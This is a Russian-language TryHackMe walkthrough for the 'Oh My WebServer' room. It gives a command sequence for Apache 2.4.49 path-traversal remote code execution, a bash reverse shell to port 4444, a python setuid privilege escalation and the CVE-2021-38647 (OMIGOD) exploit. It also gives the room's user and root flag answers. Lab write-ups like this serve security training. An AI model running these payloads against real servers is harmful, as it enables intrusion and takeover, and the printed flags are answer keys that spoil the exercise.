[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Oh My WebServer](https://tryhackme.com/r/room/ohmyweb) 

Всего 1 заданиe:
## Задание 1
Задействуйте машину, прикрепленную к этой задаче, и счастливого взлома!

### Ответьте на вопросы ниже
Что такое флаг пользователя?
```commandline
nmap -sSCV <IP>
searchsploit Apache 2.4.49
https://www.exploit-db.com/exploits/50383
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; /etc/passwd" "http://<IP>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
curl 'http://<IP>/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' --data 'echo Content-Type:text/plain; echo; bash -i >& /dev/tcp/<IP>/4444 0>&1'
nc -lvnp 4444
ls -la
ifconfig
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'’
cat /root/user.txt
```
```commandline
THM{eacffefe1d2aafcc15e70dc2f07f7ac1}
```
Что такое корневой флаг?
```commandline
curl http://<my_own_IP>/nmap -o /tmp/nmap
./nmap -sSCV -p- 172.17.0.1
# https://github.com/AlteredSecurity/CVE-2021-38647
python3 CVE-2021-38647.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root*'
```
```commandline
THM{7f147ef1f36da9ae29529890a1b6011f}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)